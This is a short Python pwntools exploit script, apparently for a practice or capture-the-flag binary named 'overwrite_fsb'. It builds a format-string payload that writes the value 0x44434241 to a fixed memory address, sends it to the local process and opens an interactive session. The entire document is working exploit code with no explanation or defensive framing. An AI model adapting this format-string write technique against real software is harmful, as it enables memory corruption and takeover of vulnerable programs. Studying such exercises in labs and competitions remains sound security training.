from pwn import *

p = process('./overwrite_fsb')
e = ELF('./overwrite_fsb')


buf = 0x0804A038


payload = fmtstr_payload(5, {buf : 0x44434241})

p.send(payload)

p.interactive()